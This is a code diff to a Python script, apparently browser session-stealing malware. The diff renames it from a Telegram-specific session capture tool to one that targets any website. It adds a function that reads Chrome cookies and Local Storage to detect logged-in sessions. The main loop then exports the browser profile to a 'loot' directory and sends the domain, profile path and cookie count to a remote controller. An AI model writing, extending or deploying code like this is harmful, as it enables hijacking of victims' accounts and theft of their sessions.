@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Telegram Session Capture - Monitors for Telegram Web login
+Web Session Capture - Monitors for any website login
 """
 
 import os
@@ -175,13 +175,44 @@ def send_to_controller(data_type, data):
         return False
 
 
+def detect_login():
+    """Detect if user is logged into any website"""
+    cookies = get_chrome_cookies()
+    
+    # Check if we have significant cookies (indicates login)
+    if len(cookies) < 5:
+        return None, None
+    
+    # Get the primary domain being accessed
+    domains = set()
+    for cookie in cookies:
+        domain = cookie.get("domain", "").lower()
+        if domain and not domain.startswith("."):
+            domains.add(domain)
+    
+    # Check Local Storage
+    ls_path = CHROME_PROFILE / "Local Storage" / "leveldb"
+    has_local_storage = False
+    if ls_path.exists():
+        ls_size = sum(f.stat().st_size for f in ls_path.rglob('*') if f.is_file())
+        if ls_size > 5000:
+            has_local_storage = True
+    
+    # If we have cookies + local storage, likely logged in
+    if len(cookies) > 5 and has_local_storage:
+        primary_domain = list(domains)[0] if domains else "unknown"
+        return primary_domain, cookies
+    
+    return None, None
+
+
 def main():
     global session_captured
     
-    print(f"[TG Monitor] Starting...", flush=True)
-    print(f"[TG Monitor] Profile: {CHROME_PROFILE}", flush=True)
-    print(f"[TG Monitor] Controller: {CONTROLLER_URL}", flush=True)
-    print(f"[TG Monitor] Session ID: {SESSION_ID}", flush=True)
+    print(f"[Monitor] Starting...", flush=True)
+    print(f"[Monitor] Profile: {CHROME_PROFILE}", flush=True)
+    print(f"[Monitor] Controller: {CONTROLLER_URL}", flush=True)
+    print(f"[Monitor] Session ID: {SESSION_ID}", flush=True)
     
     (LOOT_DIR / SESSION_ID).mkdir(parents=True, exist_ok=True)
     
@@ -195,51 +226,32 @@ def main():
             
             check_count += 1
             
-            cookies = get_chrome_cookies()
-            
-            # Check Local Storage for Telegram auth
-            ls_path = CHROME_PROFILE / "Local Storage" / "leveldb"
-            has_local_storage = False
-            if ls_path.exists():
-                ls_size = sum(f.stat().st_size for f in ls_path.rglob('*') if f.is_file())
-                if ls_size > 5000:
-                    has_local_storage = True
-            
-            # Check IndexedDB for Telegram
-            idb_path = CHROME_PROFILE / "IndexedDB"
-            has_telegram_idb = False
-            if idb_path.exists():
-                for item in idb_path.iterdir():
-                    if "telegram" in item.name.lower():
-                        size = sum(f.stat().st_size for f in item.rglob('*') if f.is_file())
-                        if size > 1000:
-                            has_telegram_idb = True
-                            break
+            domain, cookies = detect_login()
             
             # Log status every 10 checks
             if check_count % 10 == 0:
-                print(f"[TG Monitor] Check #{check_count}: idb={has_telegram_idb}, ls={has_local_storage}", flush=True)
+                print(f"[Monitor] Check #{check_count}: domain={domain}, cookies={len(cookies) if cookies else 0}", flush=True)
             
-            # Detect session: have IndexedDB AND local storage
-            session_detected = has_telegram_idb and has_local_storage
-            
-            if session_detected and not session_captured:
-                print(f"[TG Monitor] *** SESSION CAPTURED! ***", flush=True)
+            if domain and not session_captured:
+                print(f"[Monitor] *** SESSION DETECTED! ***", flush=True)
+                print(f"[Monitor] Domain: {domain}", flush=True)
                 
                 session_captured = True
                 
                 # Export profile
                 profile_path = export_session()
-                print(f"[TG Monitor] Exported to: {profile_path}", flush=True)
+                print(f"[Monitor] Exported to: {profile_path}", flush=True)
                 
                 # Send to controller
-                result = send_to_controller("telegram_session", {
-                    "profile_path": profile_path
+                result = send_to_controller("web_session", {
+                    "domain": domain,
+                    "profile_path": profile_path,
+                    "cookie_count": len(cookies) if cookies else 0
                 })
-                print(f"[TG Monitor] Sent to controller: {result}", flush=True)
+                print(f"[Monitor] Sent to controller: {result}", flush=True)
         
         except Exception as e:
-            print(f"[TG Monitor] Error: {e}", file=sys.stderr, flush=True)
+            print(f"[Monitor] Error: {e}", file=sys.stderr, flush=True)
             import traceback
             traceback.print_exc()
         
